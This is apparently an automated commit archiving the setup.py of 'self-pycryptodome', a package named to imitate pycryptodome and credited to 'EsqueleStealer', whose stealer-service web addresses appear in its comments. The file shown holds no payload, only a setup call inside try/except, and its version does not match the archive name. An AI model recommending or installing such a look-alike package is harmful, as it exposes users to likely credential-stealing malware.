361776dd7aabd1a553665bba4471c836f2b1ebae
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-18 03:04:58 +0000

    Add package self-pycryptodome/8.60/self_pycryptodome-8.60.tar.gz

---
+++ packages/self-pycryptodome/self_pycryptodome-8.60.tar.gz/self_pycryptodome-8.60/setup.py
@@ -0,0 +1,31 @@
+
+from distutils.core import setup
+
+# EsqueleSquad ( www.esquelesquad.rip )
+# EsqueleStealer ( www.esquelestealer.top | https://www.esquelestealer.top/v1/discord )
+try:
+  setup(
+    name = 'self-pycryptodome',
+    packages = ['self-pycryptodome'],
+    version = '5.95',
+    # license='MIT',
+    description = '',
+    author = 'EsqueleStealer',
+    author_email = 'info@esquelestealer.top',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass
